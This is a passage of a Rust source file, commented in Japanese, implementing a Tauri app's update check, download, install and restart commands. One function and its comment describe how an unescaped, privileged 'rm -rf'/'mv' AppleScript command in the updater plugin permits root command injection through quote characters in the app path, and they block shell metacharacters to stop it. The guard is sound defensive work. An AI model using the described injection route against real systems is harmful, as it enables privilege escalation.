use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Duration;

use serde::Serialize;
use tauri::{AppHandle, Emitter};
use tauri_plugin_updater::UpdaterExt;
use ts_rs::TS;

use crate::comment_sidecar;
use crate::error::{AppError, AppResult};

/// 更新チェック 1 回あたりの上限時間。
///
/// ⚠ **これが無いとハングする**。`check()` の実体は reqwest の HTTP GET で、**reqwest は既定で
/// タイムアウトを持たない**。ネットワークが「切断」ではなく「繋がるが応答しない」状態
/// （キャプティブポータル・パケット落ち・SYN が落ちる）では `check()` が返らず、055c の UI が
/// 「確認中」から永久に戻らない——**panic を全部潰しても同じ事故になる**（invoke の Promise が
/// 永久未解決になるのと症状が同じ）。機内モードは即 fail するのでこの経路では再現しない。
///
/// 値の根拠: 取得対象は `latest.json` 1 本（1KB 前後）で、302 リダイレクト 1 回を含めても 15 秒は
/// 十分に緩い。チェックは起動時に自動で走るだけなので、遅い回線で稀に空振りしても実害が無い側に倒せる。
///
/// ⚠ **055d への申し送り（レビュー指摘で訂正・当初の記述は事実と逆だった）**: この値は
/// **`download()` には伝播しない**。`tauri-plugin-updater` 2.10.1 の `Updater::check()` は戻り値を
/// `Update { timeout: None, .. }` と**ハードコード**して組み立て（`updater.rs` の `Update` 構築部）、
/// `Update::download()` はその `self.timeout`（＝`None`）を見る。＝**DL 側は既定で無期限**。
/// したがって 055d の課題は「15 秒を引き継がせないこと」ではなく、**DL に別途上限を張ること**。
/// ただし `Update.timeout` は reqwest の**総**リクエスト時間なのでサイズ依存で値を決められない。
/// reqwest 自身が「サイズが事前に分からない場合は `read_timeout`（各 read でリセット）が適切」と
/// 明記しているので、055d は `configure_client` で `connect_timeout` + `read_timeout` を張る形を採ること
/// （`configure_client` は `Update` に**持ち越される**ので `download()` にも効く）。
const CHECK_TIMEOUT: Duration = Duration::from_secs(15);

/// 055d: ダウンロードの **接続** 上限。
///
/// `CHECK_TIMEOUT` と同じ 15 秒。TCP + TLS ハンドシェイクに 15 秒かかる回線は事実上使えないので、
/// 「そもそも繋がらない」の判定として十分に緩い。定数を 2 種類の思考単位に分けたくないので値を合わせている。
/// ⚠ reqwest の `connect_timeout` は tokio のタイマを要求するが、`#[tauri::command] async fn` は
/// Tauri の tokio ランタイム上で走るので満たされている。
const DOWNLOAD_CONNECT_TIMEOUT: Duration = Duration::from_secs(15);

/// 055d: ダウンロードの **read** 上限（**各 read で毎回リセットされる**）。
///
/// ⚠ **なぜ総リクエスト時間（`Update.timeout`）を使わないのか**: `Update.timeout` は reqwest の
/// `ClientBuilder::timeout`＝「接続開始からボディ読み切りまで」の総 deadline なので、
/// **成果物のサイズと回線速度に依存して妥当値が決まらない**。100MB を低速回線で落とす正常なケースを
/// 殺してしまう。reqwest 自身が `read_timeout` の doc で
/// "The timeout applies to each read operation, and resets after a successful read.
///  This is more appropriate for detecting stalled connections when the size isn't known beforehand."
/// と明記しているとおり、サイズ不定の転送はこちらで守るのが正しい。
///
/// 値の根拠: read ごとにリセットされるので**総 DL 時間は縛らない**。一方、健全な TCP 接続で 30 秒間
/// 1 バイトも届かないことは（再送のバックオフを考えても）事実上ありえないので、
/// 「繋がるが応答しない」（キャプティブポータル・パケット落ち）を確実に検出できる。
/// ユーザー体感でも、押してから 30 秒以内に定型エラーへ落ちる。
///
/// ⚠ **`configure_client` は `Update` に持ち越される**（`Updater::check()` が
/// `configure_client: self.configure_client.clone()` で引き継ぐ）ので、この 2 つは `download()` にも効く。
/// 逆に `UpdaterBuilder::timeout()` は `Update { timeout: None, .. }` とハードコードされるため
/// **DL には効かない**（`CHECK_TIMEOUT` の注記。055b レビューで訂正済み）。
const DOWNLOAD_READ_TIMEOUT: Duration = Duration::from_secs(30);

/// 進捗イベントを間引く粒度（受信済みバイト数がこれだけ増えるごとに 1 発）。
///
/// `on_chunk` は 1 チャンク（数 KB〜数十 KB）ごとに呼ばれるので、素直に emit すると 100MB で数千発になり、
/// IPC と React の再レンダリングを無駄に叩く。時間ベース（`Instant`）にしないのは、
/// **純関数 `should_emit_progress` にして境界をテストで固定できるようにするため**。
const PROGRESS_EMIT_BYTES: u64 = 512 * 1024;

/// 進捗イベント名。
///
/// **リポジトリ初の Tauri イベント**なので命名規約もここで決める:
/// `<feature ディレクトリ名>:<出来事>`（`src/features/app-update/` と一致させる）。
/// Tauri が許すのは英数と `-` `/` `:` `_` のみ（`tauri::event::event_name::is_event_name_valid`）。
///
/// ⚠ **capability は増えない**。frontend の `listen` に必要な `core:event:allow-listen` は
/// `core:default` → `core:event:default` に既に含まれており（`gen/schemas/acl-manifests.json` で実測）、
/// 4 枚の capability はすべて `core:default` を持っている。
///
/// ⚠ **`app.emit()` は全窓ブロードキャスト**（コメビュ窓・オーバーレイ 2 窓にも届く）。
/// `emit_to(EventTarget::webview_window("main"), …)` に絞っても**実際には絞れない**:
/// tauri の `match_any_or_filter` は「リスナ側が `EventTarget::Any` で登録していれば
/// emit のフィルタを無条件に素通しする」実装で、`@tauri-apps/api` の `listen()` は
/// オプション省略時にまさに `Any` で登録する。＝絞ったつもりの記録だけが残るので採らない。
/// 実際に届く先がメイン窓だけであることは「`MainWindowApp` でしか購読しない」という
/// **アプリ側の構造**で担保している（イベント機構による保証ではない）。
/// ペイロードはバイト数とフェーズだけなので情報漏えいの面はゼロ（§9）。
///
/// ⚠ **`core:event:allow-emit` も既定で配られている**＝webview 側から同名イベントを**偽造できる**。
/// 偽の進捗が表示されるだけで何のアクションも起こらないが、
/// **完了判定はイベントではなく invoke の resolve で行う**こと（この不変条件は崩さない）。
const APP_UPDATE_PROGRESS_EVENT: &str = "app-update:progress";

/// `install_app_update` の同時実行ガード。
///
/// ⚠ frontend の `inFlightRef` が守るのは**メイン窓の中だけ**。Tauri v2 では
/// **アプリ定義コマンドは ACL の対象外**なので、`install_app_update` はコメビュ窓・オーバーレイ 2 窓を
/// 含む 4 窓すべての webview から呼べる（親 055 に記録済みの限界）。ここが 055b の security-review 指摘
/// **S-4「多重実行ガード・レート制限が無い」**に対する回答でもある。
///
/// `Mutex` ではなく `AtomicBool` にしたのは、このリポジトリの State がすべて `std::sync::Mutex` で、
/// **`.await` を跨いでロックを握ると `Send` 境界で落ちるかデッドロックする**ため（親 055 の注記）。
/// アトミックならどちらも起こらない。
static INSTALL_IN_FLIGHT: AtomicBool = AtomicBool::new(false);

/// `check_app_update` の戻り値。JSON は camelCase。
///
/// ⚠ **`latest_version` / `notes` / `pub_date` は minisign 署名の対象外**。署名が守るのは
/// ダウンロードした実体（`.app.tar.gz` / `.exe`）のバイト列だけで、`latest.json` そのものは
/// 署名されていない。＝**表示側（055c / 055e）はこれらを HTML として解釈してはいけない**
/// （055e が `dangerouslySetInnerHTML` を使わず自前の最小マークダウンレンダラを書く決定はここで意味を持つ）。
#[derive(Debug, Serialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/features/app-update/bindings/")]
pub struct AppUpdateStatus {
    /// いま動いているバージョン（`tauri.conf.json` の `version`＝updater が実際に比較する値）。
    pub current_version: String,
    /// 更新があるか。**055c のバッジの出し分けはこれだけで決まる**。
    ///
    /// ⚠ `false` は「確認できて、更新が無かった」を意味する。「確認できなかった」は `Err(AppError)`
    /// （`code: UPDATE_CHECK_FAILED`）で返るので、055c はこの 2 つを別表示にできる。
    pub available: bool,
    /// 更新がある場合の新バージョン。
    #[ts(optional)]
    pub latest_version: Option<String>,
    /// `latest.json` の `notes`（＝`docs/release-notes/vX.Y.Z.md` の内容そのまま・マークダウン原文）。
    #[ts(optional)]
    pub notes: Option<String>,
    /// 公開日時（`latest.json` の `pub_date`・RFC3339 文字列のまま）。
    #[ts(optional)]
    pub pub_date: Option<String>,
}

/// `install_app_update` の結果。**「何もしなかった」を成功と混ぜないため**に用意した（055d review S-2）。
///
/// ⚠ **当初は `AppResult<()>` だった**。`Ok(())` を返す経路が
/// 「インストールした」「再 check したら更新が無かった」「**別の実行が走行中だった**」の 3 つあり、
/// frontend が resolve を一律「完了」と読むため、**走行中の自己置換の最中に
/// 「更新の準備ができました」＋再起動ボタンが出る**という誤報が成立していた
/// （watchdog 発火 → 再確認 → もう一度アップデート、の 2 クリックで到達する）。
/// macOS でその再起動が `install_inner()` の 2 回の `rename` の間に刺さると、
/// **`.app` が退避されたまま消える**（ロールバック機構は無い・§5 例外）。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/features/app-update/bindings/")]
pub enum AppUpdateInstallOutcome {
    /// ダウンロードとインストールを完了した（macOS。Windows はここへ到達せずプロセスが消える）。
    Installed,
    /// 再 check したら更新が無かった＝**何もしていない**。
    ///
    /// ⚠ 現在の frontend はこれも「完了」表示に畳んでいる（押しても再起動するだけで害が無いため・
    /// progress.md 055d 節⑧の受容）。**区別する材料はこの値で既に揃っている**ので、
    /// 「更新していないのに再起動を促された」という混乱が実際に起きたら `useAppUpdate` 側だけで直せる。
    NoUpdate,
    /// 別の `install_app_update` が走行中だったので**何もしなかった**（`InstallGuard` に弾かれた）。
    ///
    /// ⚠ **これを「完了」に畳んではいけない**（上記の誤報が復活する）。
    AlreadyRunning,
}

/// 進捗イベントのフェーズ。
///
/// **`installed` は無い**。完了は「invoke が resolve したこと」で判定する
/// （イベントは webview から偽造できるため・`APP_UPDATE_PROGRESS_EVENT` の注記）。
/// また Windows では `install()` が `std::process::exit(0)` するので `installed` を送る機会自体が無い。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/features/app-update/bindings/")]
pub enum AppUpdateProgressPhase {
    /// バイト列を受信中。
    Downloading,
    /// 受信完了。**minisign 検証 → 展開 → 自己置換**をこのフェーズが含む
    /// （plugin は `on_download_finish()` の**後**に `verify_signature()` を走らせる）。
    Installing,
}

/// 進捗イベントのペイロード。**載せてよいのはこの 3 つだけ**（§9）。
///
/// ⚠ **URL・ローカルパス・バージョン文字列・環境情報を絶対に足さないこと。**
/// バージョンは `check_app_update` の戻り値として既に画面が持っているので、ここで運ぶ必要が無い。
/// この不変条件は下の `progress_payload_only_carries_bytes_and_phase` がキー集合の完全一致で固定している。
///
/// ⚠ `total_bytes` に `#[ts(optional)]` を**付けていない**のは意図的。`AppUpdateStatus` は
/// `#[ts(optional)]` を付けた結果「TS 型は `?` なのに実際は `null` が届く」という既知の乖離を抱えている
/// （055c の申し送り）。新しい型で同じ穴を作らないため、`Option<u64>` をそのまま
/// `totalBytes: number | null` として出す＝**wire と TS 型が一致する**。
///
/// ⚠ **`#[ts(type = "number")]` を明示している理由**: ts-rs は `u64` を既定で **`bigint`** に写すが、
/// **wire を流れるのは JSON の数値**で、`JSON.parse` が返すのは `bigint` ではなく `number` である。
/// 既定のまま出すと「型は bigint なのに実体は number」という嘘の型になり、
/// 割り算（進捗率）を書いた瞬間に実行時例外になる。
/// 他の選択肢は**リポジトリ全体の慣習どおり `u32` にする**ことだったが、4GB で静かに折り返すうえ
/// `as u32` のキャストが増えるので採らず、Rust 側は `u64` のまま wire の型だけを正しく宣言する。
/// 更新成果物は 10〜200MB 程度で `Number.MAX_SAFE_INTEGER`（2^53）には遠く及ばないため精度の問題は無い。
#[derive(Debug, Clone, Copy, Serialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/features/app-update/bindings/")]
pub struct AppUpdateProgress {
    pub phase: AppUpdateProgressPhase,
    /// 受信済みバイト数（累計）。
    #[ts(type = "number")]
    pub downloaded_bytes: u64,
    /// 総バイト数。`Content-Length` が無い応答では `None`＝**UI は不定形（インデターミネート）表示にする**。
    #[ts(type = "number | null")]
    pub total_bytes: Option<u64>,
}

/// 進捗イベントを 1 発送る。**失敗は握って捨てる**。
///
/// ⚠ ここを `?` にしてはいけない。「イベントを 1 回配信できなかっただけ」で
/// 進行中のインストールを中断することになる（表示が更新されないのは実害が桁違いに軽い）。
/// `Emitter::emit` が失敗するのはイベント名が不正なときとペイロードの直列化に失敗したときで、
/// どちらもコンパイル時に決まっているため実行時には起きない。
fn emit_progress(app: &AppHandle, progress: AppUpdateProgress) {
    let _ = app.emit(APP_UPDATE_PROGRESS_EVENT, progress);
}

/// 進捗イベントを送るべきか（`PROGRESS_EMIT_BYTES` ごとに 1 発に間引く）。
///
/// 純関数にしてあるのは、`install_app_update` 本体が実ネットワークに出るため単体テスト不可な一方、
/// **間引きの境界だけは機械で固定できる**から（値を緩める／間引きを消す変異を殺せる）。
fn should_emit_progress(downloaded_bytes: u64, last_emitted_bytes: u64) -> bool {
    downloaded_bytes.saturating_sub(last_emitted_bytes) >= PROGRESS_EMIT_BYTES
}

/// `INSTALL_IN_FLIGHT` の RAII ガード。
///
/// ⚠ **`Drop` を消すと、1 度でも失敗した後は二度と更新できなくなる**（フラグが立ったまま
/// `install_app_update` が常に即 `Ok(())` を返す＝**サイレントな機能停止**で、ユーザーは
/// 「ボタンを押しても何も起きない」としか観測できない）。だから下の契約テストで `Drop` の存在も固定している。
struct InstallGuard;

impl InstallGuard {
    /// 取得できたときだけ `Some`。既に走っているなら `None`。
    fn acquire() -> Option<Self> {
        INSTALL_IN_FLIGHT
            .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
            .ok()
            .map(|_| InstallGuard)
    }
}

impl Drop for InstallGuard {
    fn drop(&mut self) {
        INSTALL_IN_FLIGHT.store(false, Ordering::SeqCst);
    }
}

/// 昇格インストール経路（AppleScript）へ渡して安全なパスか（055d review S-1）。
///
/// 純関数にしてあるのは、実際の `current_exe()` はテストから差し替えられない一方で
/// **どの文字を危険とみなすかだけは機械で固定できる**から。
fn path_is_safe_for_the_elevated_install(path: &str) -> bool {
    // `'` … シェルのクォートを脱出できる（root 権限のコマンドインジェクション）
    // `"` `\` … AppleScript リテラルを壊す（plugin の `script.compile().expect(…)` がメインスレッドで panic）
    // `` ` `` `$` … 脱出後のコマンド置換・変数展開
    // 改行 … 1 行目だけが `do shell script` に渡り、残りが別の AppleScript 文になる
    !path
        .chars()
        .any(|c| matches!(c, '\'' | '"' | '\\' | '`' | '$' | '\n' | '\r'))
}

/// 055d review S-1: **昇格インストール経路へ渡すパスに shell メタ文字が無いこと**を先に確かめる。
///
/// ⚠ `tauri-plugin-updater` 2.10.1 の macOS 昇格経路（`updater.rs` の `install_inner`）は
/// `do shell script "rm -rf '{extract_path}' && mv -f '{tmp}' '{extract_path}'" with administrator privileges`
/// を **エスケープせずに** 組み立てる。`extract_path` は `current_exe()` 由来＝
/// **ユーザーにも同一権限のプロセスにも書き換えられる**（`.app` のリネーム／親ディレクトリ名）ので、
/// `'` が入れば **root 権限のコマンドインジェクション**、`"` / `\` が入れば
/// `script.compile().expect("invalid AppleScript")` が**メインスレッドで panic** する。
/// 昇格分岐に入るのは `/Applications` へ書けないとき＝**標準ユーザーで実行すると毎回**なので稀ではない。
///
/// ＝ §4 の例外が安全なのは「ユーザー入力が入らないから」ではなく、
/// **ここで fail-closed に弾いているから**である。この関数を消すと例外の前提が崩れる
/// （契約テスト `install_refuses_shell_unsafe_install_paths` が消失を止めている）。
///
/// ⚠ **パスを `AppError` に載せない**（§9）。ユーザーに出るのは定型文言だけで、
/// 「アプリの場所に使えない文字がある」ことは伝わらない。**受容した劣化**——
/// 出すとインストール先の絶対パスが画面とログに載るため（§9 のほうを優先した）。
/// 再修正トリガー＝099b の実機で「原因が分からない」問い合わせが出たら、
/// パスを含めない範囲の専用文言（`ErrorCode` を 1 個増やす）を検討する。
///
/// 昇格経路を持たない Windows / Linux では何もしない
/// （Windows が shell へ渡すのは plugin が作る一時ディレクトリのパスだけで、
///  `current_exe_args` は `escape_nsis_current_exe_arg` でエスケープされる）。
fn ensure_install_path_is_shell_safe() -> AppResult<()> {
    if !cfg!(target_os = "macos") {
        return Ok(());
    }
    let executable = std::env::current_exe().map_err(|_| AppError::update_install_failed())?;
    if !path_is_safe_for_the_elevated_install(&executable.to_string_lossy()) {
        return Err(AppError::update_install_failed());
    }
    Ok(())
}

/// `latest.json` の `pub_date` を **RFC3339 文字列のまま**取り出す。
///
/// `Update.date`（`time::OffsetDateTime`）を使うと `time` を直接依存に足すことになるので、
/// plugin がサーバ応答をそのまま持っている `raw_json` から抜く（§10・詳細は呼び出し側の注記）。
///
/// **キーが無い / 文字列でない / そもそもオブジェクトでない場合は `None` に劣化する**（panic しない）。
/// ⚠ この劣化は**静かに起きる**——`latest.json` のキー名が変わっても表示から日付が消えるだけで、
/// エラーにならない。実サーバとのキー名一致は publish 後の実機確認でしか検証できない
///（再修正トリガー＝実機で `pubDate` が `undefined` なら 055a の `make-latest-json.mjs` と突き合わせる）。
fn pub_date_from_raw(raw: &serde_json::Value) -> Option<String> {
    raw.get("pub_date")
        .and_then(|v| v.as_str())
        .map(str::to_owned)
}

/// 055b: 公開リリースの `latest.json` を見て「更新があるか」だけを判定する読み取り専用コマンド。
///
/// **リポジトリ初の真の `async fn` コマンド**。既存の `#[tauri::command(async)]`（窓生成コマンド）は
/// 「同期 fn を tokio worker で走らせる」だけで本体は同期だったが、updater の Rust API は `.await` 必須で、
/// Tauri の async runtime 内なので `block_on` の逃げ道が無い。`#[tauri::command]` + `async fn` は Tauri が
/// `async_runtime::spawn` へ載せるため、返す Future は `Send` でなければならない。
///
/// **await をまたいで非 Send な値を持たない**: このコマンドは DB State（`Mutex<Connection>`）を取らないので
/// `MutexGuard` を `.await` 跨ぎで保持する余地が構造的に無い。引数は `AppHandle` のみ＝最小権限
/// （`extract_app_icon` と同じ思想）で、**frontend から URL もバージョンも受け取らない**（§3/§8）。
///
/// ⚠ **panic すると invoke の Promise が永久未解決になる**（`lib.rs` の `WINDOW_OPEN_LOCK` 周辺コメントが
/// 同じ罠を記録済み）。`unwrap` / `expect` を使わず、**ネットワーク到達不可 / エンドポイント 404
/// （＝まだ publish していない draft のとき）/ `latest.json` の JSON 破損 / 署名検証失敗**をすべて
/// `Err(AppError)` に落とす。**`available: false` に潰さない**（「更新なし」と「確認できなかった」は
/// 055c で別表示にするため区別が要る）。
///
/// ⚠ 生エラーを `AppError.message` に載せない（§9）。updater / reqwest のエラー文字列は
/// **エンドポイント URL を含む**ため、`map_err(|_| …)` でエラー値を束縛せずに捨てる
/// （詳細は `AppError::update_check_failed` の注記。この形は下の契約テストで機械的に固定している）。
#[tauri::command]
pub async fn check_app_update(app: AppHandle) -> AppResult<AppUpdateStatus> {
    // updater が比較するのと同じ源（`tauri.conf.json` の version）を返す。診断画面が表示する
    // アプリバージョンは `env!("CARGO_PKG_VERSION")`（＝Cargo.toml）で出どころが違うが、
    // 055a の `check-version-sync.mjs` が 5 箇所の一致を強制しているので実運用ではズレない。
    let current_version = app.package_info().version.to_string();

    // ⚠ `endpoints` / `pubkey` は `updater_builder()` が `tauri.conf.json` から読んだものをそのまま使う。
    // **`UpdaterBuilder::endpoints()` は呼ばない**（宛先はコンパイル時定数の 1 本だけ＝親 055 の egress 定義）。
    // 足すのはハング対策のタイムアウトだけ。
    let updater = app
        .updater_builder()
        .timeout(CHECK_TIMEOUT)
        .build()
        .map_err(|_| AppError::update_check_failed())?;

    let update = updater
        .check()
        .await
        .map_err(|_| AppError::update_check_failed())?;

    let Some(update) = update else {
        // `Ok(None)` ＝「確認できて、更新は無かった」。エラーに落とさない。
        return Ok(AppUpdateStatus {
            current_version,
            available: false,
            latest_version: None,
            notes: None,
            pub_date: None,
        });
    };

    // `Update.date` は `time::OffsetDateTime` で、文字列化するには `time` を**直接依存**に足す必要がある
    // （現在は plugin の推移依存なので `use time::…` は書けない）。`raw_json` は plugin が
    // `res.json::<serde_json::Value>()` した**サーバ応答そのもの**（`RemoteRelease` へのデシリアライズ前の値）
    // なので、そこから RFC3339 文字列のまま取り出して直接依存を増やさない（§10）。
    //
    // ⚠ 劣化は静かに起きる（キー名・型が違うとフィールドごと消える）。詳細は `pub_date_from_raw` の注記。
    let pub_date = pub_date_from_raw(&update.raw_json);

    Ok(AppUpdateStatus {
        current_version,
        available: true,
        latest_version: Some(update.version),
        notes: update.body,
        pub_date,
    })
}

/// 055d: 更新をダウンロードしてインストールする。進捗は `APP_UPDATE_PROGRESS_EVENT` で流す。
///
/// **引数は `AppHandle` のみ**（§3 最小権限 / §8）。URL・バージョン・ファイル名・保存先を
/// **frontend から一切受け取らない**——受け取ると「フロントから任意の場所を落として実行させる」経路が生まれる。
/// 宛先は `tauri.conf.json` の `plugins.updater.endpoints`（コンパイル時定数）のままで、
/// `UpdaterBuilder::endpoints()` は呼ばない。この形は下の契約テストが機械的に固定している。
///
/// ⚠ **必ず `async fn` であること（同期コマンドにすると macOS でデッドロックする）**。
/// `#[tauri::command]` は `async` が無いと IPC ハンドラ＝**メインスレッド**で同期実行される。
/// plugin の macOS 昇格インストール経路は `(self.run_on_main_thread)(…)` で**イベントループにタスクを投げてから**
/// `rx.recv()` で同期ブロックするので、メインスレッドで呼ぶとそのタスクが永遠に実行されない
/// ＝ panic ですらない無言のハングになり、タイムアウトでも救えない。
///
/// **状態を持たない（毎回 `check()` からやり直す）**: `Update` を State に持ち越さないのは、
/// このリポジトリの State がすべて `std::sync::Mutex` で、`.await` を跨ぐと `Send` 境界で落ちるか
/// ロックを握ったまま await してデッドロックするため（親 055 の注記）。`Update` を Tauri の
/// resources_table へ載せる道もあるが、それは **frontend に rid を渡す設計**になり
/// 「引数は `AppHandle` のみ」に反するので採らない。
///
/// **「何もしなかった」は成功と混ぜずに戻り値で区別する**（`AppUpdateInstallOutcome`・055d review S-2）。
/// 「再 check したら更新が無かった」は `NoUpdate`、「別の実行が走行中だった」は `AlreadyRunning`。
/// どちらもエラーにはしない（多重押下・起動時チェックからの時間差・その間に別経路で更新された、を吸収する）。
///
/// ⚠ 生エラーを `AppError.message` に載せない（§9）。DL/インストールの生エラーは URL に加えて
/// **一時ディレクトリやインストール先の絶対パス**も含みうるので、`map_err(|_| …)` で束縛せずに捨てる。
#[tauri::command]
pub async fn install_app_update(app: AppHandle) -> AppResult<AppUpdateInstallOutcome> {
    // 4 窓すべてから呼べるコマンドなので Rust 側でも多重実行を止める（`INSTALL_IN_FLIGHT` の注記）。
    // ⚠ 走行中の 2 本目を `Ok(())` に畳んではいけない（frontend が「完了」と誤読する・review S-2）。
    let Some(_guard) = InstallGuard::acquire() else {
        return Ok(AppUpdateInstallOutcome::AlreadyRunning);
    };

    // ⚠ DL の**前**に弾く（100MB 落としてから捨てるのは無駄・review S-1）。
    ensure_install_path_is_shell_safe()?;

    // sidecar を落とすためのハンドル。Windows では `install()` が `std::process::exit(0)` するので、
    // 下の `on_before_exit` フックが**唯一の停止機会**になる。
    let app_for_exit = app.clone();

    let updater = app
        .updater_builder()
        // check 側のハングガード（総リクエスト時間）。DL には伝播しない。
        .timeout(CHECK_TIMEOUT)
        // DL 側のハングガード。`configure_client` は `Update` に持ち越されるので `download()` に効く。
        .configure_client(|client| {
            client
                .connect_timeout(DOWNLOAD_CONNECT_TIMEOUT)
                .read_timeout(DOWNLOAD_READ_TIMEOUT)
        })
        // ⚠ Windows の `install()` は `ShellExecuteW` でインストーラを起動した直後に
        // `std::process::exit(0)` する＝`RunEvent::Exit` も `restart_app` も通らないので、
        // ここで落とさないと **sidecar が孤児になり、次回起動でポートを掴んだまま**になる。
        //
        // ⚠⚠ `UpdaterExt::updater_builder()` は**既定でこのフックに `cleanup_before_exit()` を入れている**。
        // `on_before_exit` は `replace` なので、こちらで設定すると plugin 既定の挙動が消える。
        // **両方呼ぶこと**（片方だけにするとトレイアイコン等の後始末が飛ぶ）。
        .on_before_exit(move || {
            comment_sidecar::shutdown(&app_for_exit);
            app_for_exit.cleanup_before_exit();
        })
        .build()
        .map_err(|_| AppError::update_install_failed())?;

    let update = updater
        .check()
        .await
        .map_err(|_| AppError::update_install_failed())?;

    let Some(update) = update else {
        return Ok(AppUpdateInstallOutcome::NoUpdate);
    };

    // 受信済みバイト数の累計と、最後に emit した時点の値。
    // ⚠ `Cell` ではなく `Atomic*` を使う。`&Cell<u64>` は `Cell` が `!Sync` なので `Send` にならず、
    // それを保持する Future も `Send` でなくなって `#[tauri::command] async fn` に載らない。
    let downloaded = AtomicU64::new(0);
    let last_emitted = AtomicU64::new(0);

    // 押した直後に UI を「ダウンロード中」へ移すための 1 発目（総バイト数はまだ分からない）。
    emit_progress(
        &app,
        AppUpdateProgress {
            phase: AppUpdateProgressPhase::Downloading,
            downloaded_bytes: 0,
            total_bytes: None,
        },
    );

    let bytes = update
        .download(
            |chunk_len, content_length| {
                // ⚠ 第 1 引数は**そのチャンクのバイト数**で累計ではない（plugin は
                // `on_chunk(chunk.len(), content_length)` と呼ぶ）。累計はこちらで持つ。
                let delta = chunk_len as u64;
                let received = downloaded
                    .fetch_add(delta, Ordering::Relaxed)
                    .saturating_add(delta);
                if should_emit_progress(received, last_emitted.load(Ordering::Relaxed)) {
                    last_emitted.store(received, Ordering::Relaxed);
                    emit_progress(
                        &app,
                        AppUpdateProgress {
                            phase: AppUpdateProgressPhase::Downloading,
                            downloaded_bytes: received,
                            total_bytes: content_length,
                        },
                    );
                }
            },
            // `on_download_finish` は使わない。ここで `installing` を送ると **minisign 検証の前**に
            // なってしまう（plugin は `on_download_finish()` の後に `verify_signature()` を呼ぶ）。
            // 検証を通過して `download()` が `Ok` を返してから送るほうが、フェーズの意味が正確になる。
            || {},
        )
        .await
        .map_err(|_| AppError::update_install_failed())?;

    // ここに到達した時点で **minisign 検証は通過済み**（`download()` が検証込みで `Ok` を返した）。
    // 総バイト数は受信し切った実長がそのまま使える＝進捗バーを 100% で確定させられる。
    let downloaded_bytes = bytes.len() as u64;
    emit_progress(
        &app,
        AppUpdateProgress {
            phase: AppUpdateProgressPhase::Installing,
            downloaded_bytes,
            total_bytes: Some(downloaded_bytes),
        },
    );

    // ⚠ macOS はここで `.app` を丸ごと置換する（security.md §5 の例外）。Windows はここから戻らない
    // （インストーラを起動して `std::process::exit(0)`）＝ invoke は resolve せずプロセスが消える。
    // frontend はこれを異常として扱わないこと。
    // ⚠ **同期関数を tokio worker 上で直接呼んでいる**（`spawn_blocking` にしていない）。
    //    `tauri::async_runtime` は `TokioRuntime::new()`＝マルチスレッドなので worker 1 本の占有は他コマンドを
    //    止めないうえ、`spawn_blocking` にしても macOS の昇格経路は `run_on_main_thread` で
    //    **メインスレッドを塞ぐ**ので UI が固まる事実は変わらない（＝移しても得るものが無い）。
    //    plugin 自身の `download_and_install` も同じ形。
    //    再修正トリガー＝コア数の少ない環境で「更新中に他の操作が固まる」が実測されたら移す。
    update
        .install(bytes)
        .map_err(|_| AppError::update_install_failed())?;

    Ok(AppUpdateInstallOutcome::Installed)
}

/// 055d: 新しいバージョンを反映するためにアプリを再起動する。
///
/// **`tauri-plugin-process` は入れない**（`process:allow-restart` を配らずに済む・親 055 の決定）。
///
/// ⚠ **必ず `async fn` であること（メインスレッドから呼ぶと sidecar が孤児になる）**。
/// `AppHandle::restart()` は**呼び出しスレッドで挙動が変わる**:
/// - メインスレッド → `RunEvent::ExitRequested` / `RunEvent::Exit` を**発火せずに**
///   `cleanup_before_exit()` してから即再起動する（tauri の doc に
///   "we cannot guarantee the delivery of those events, so we skip them" と明記）。
///   ＝ `lib.rs` の `RunEvent::Exit` フックが走らない＝ `comment_sidecar::shutdown` が呼ばれない。
/// - 別スレッド → `request_exit(RESTART_EXIT_CODE)` 経由で `RunEvent::Exit` が発火する（`lib.rs` は
///   `ExitRequested` を握っていないので途中で止まらない）。その後この関数は戻らない。
///
/// `async fn` にすれば後者になるが、**それに依存しない**。`cleanup_before_exit()` が触るのは
/// トレイアイコンと resources_table だけで **sidecar には一切触れない**ので、
/// ここで明示的に落としてから再起動する。`comment_sidecar::shutdown` は `guard.take()` で
/// **idempotent** なので、`RunEvent::Exit` 経由でもう一度呼ばれても無害（`lib.rs` に既記）。
///
/// ⚠ `run_on_main_thread` でラップしてはいけない（上記のとおりメインスレッド分岐に落ちてしまう）。
///
/// 戻り値が `AppResult<()>` なのは他コマンドと形を揃えるためで、失敗経路は無い
/// （`AppHandle::restart()` は `-> !`＝戻らないので、`!` が `AppResult<()>` に型強制される）。
///
/// ⚠ **`has_no_panicking_unwrap_or_expect` が約束する範囲より、実際の不変条件のほうが広い**
/// （055d review S-6）。`include_str!` が読むのは `commands.rs` だけだが、
/// `comment_sidecar::shutdown` は内部で `state.lock().expect("comment sidecar mutex poisoned")` を持つ
/// ＝ mutex が poison していれば**ここでも invoke の Promise が永久未解決**になる（`on_before_exit` も同じ）。
/// poison は「ロックを握ったまま panic」でしか起きず、`comment_sidecar` 側は取得直後に `take()` するだけなので
/// 現実には起きない。**共有部の既存作法をこのタスクで変えない**ためそのままにしている。
/// 再修正トリガー＝`comment_sidecar` を触るタスクが来たら `lock()` を `unwrap_or_else(|e| e.into_inner())` に
/// 寄せる（poison を無視して続行するほうが、更新経路では常に正しい）。
#[tauri::command]
pub async fn restart_app(app: AppHandle) -> AppResult<()> {
    comment_sidecar::shutdown(&app);
    app.restart()
}

#[cfg(test)]
mod command_contract {
    //! security-review が見る不変条件を、**このファイルのソース自身**を読んで機械的に固定する。
    //!
    //! ⚠ **055d で `check_command_contract` から改名した**。`check_app_update` 専用ではなく
    //! `install_app_update` / `restart_app` も見るようになったため。
    //! **新コードを別ファイルに分けず同じファイルへ置いた最大の理由がこれ**——`include_str!` は
    //! ファイル全体を読むので、既存の 3 本（endpoints / panic / map_err）が
    //! **追加したコードにも自動で効く**。分割するとその効果を丸ごと失う。
    //!
    //! ⚠ **照合対象にはこのテストモジュール自身のコードも含まれる**。したがって
    //! テストを書くときも `unwrap()` / `.expect(` / panic 系マクロ / `map_err(|e|` を使えない
